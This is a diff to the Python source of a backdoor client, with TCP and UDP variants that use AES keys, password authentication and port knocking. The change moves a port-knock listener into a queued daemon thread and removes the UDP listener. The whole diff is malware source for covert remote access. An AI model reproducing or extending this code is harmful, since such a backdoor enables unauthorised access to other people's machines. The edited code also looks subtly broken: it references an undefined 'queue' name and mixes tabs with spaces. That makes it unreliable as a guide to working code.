@@ -489,19 +489,13 @@ class BackdoorClient(object):
             print("Unhandled result type {}".format(result_type))
             sys.exit(1)
 
-	
-    def run(self, protocol):
-	raise NotImplementedError
-        """Runs in a loop listening for server port knocks"""
+    def knock_queue(self, queue):
+        while True:
+            result = queue.get()
+            self.port_knock()
+            queue.task_done()
 
-class TcpBackdoorClient(BackdoorClient):
-    def __init__(self, aeskey, password, listenport, serverport, server):
-        super(TcpBackdoorClient, self).__init__(aeskey, password)
-        self.server = server
-        self.lport = listenport
-        self.dport = serverport
-
-    def run(self):
+    def port_knock(self):
         """ Open the TCP port and wait for the client to ping """
 
         tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -515,6 +509,22 @@ class TcpBackdoorClient(BackdoorClient):
             data = conn.recv(1024)
             if not data: 
                 break
+	
+    def client_thread(self):
+        port_knock_thread = Thread(target=self.knock_queue, args=(queue,))
+        port_knock_thread.setDaemon(True)
+        port_knock_thread.start()
+
+    def run(self, protocol):
+        raise NotImplementedError
+        """Runs in a loop listening for server port knocks"""
+
+class TcpBackdoorClient(BackdoorClient):
+    def __init__(self, aeskey, password, listenport, serverport, server):
+        super(TcpBackdoorClient, self).__init__(aeskey, password)
+        self.server = server
+        self.lport = listenport
+        self.dport = serverport
 
     def connect(self):
         # Insert the password into the packet so that the server can authenticate us
@@ -548,12 +558,6 @@ class UdpBackdoorClient(BackdoorClient):
         self.server = server
         self.lport = listenport
         self.dport = serverport
-
-    def run(self):
-        #handle listening for UDP connection
-        udpsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
-        udpsock.bind(('', self.lport))
-        data, client = udpsock.recvfrom(100)
 
     def connect(self):
         # Insert the password into the packet so that the server can authenticate us
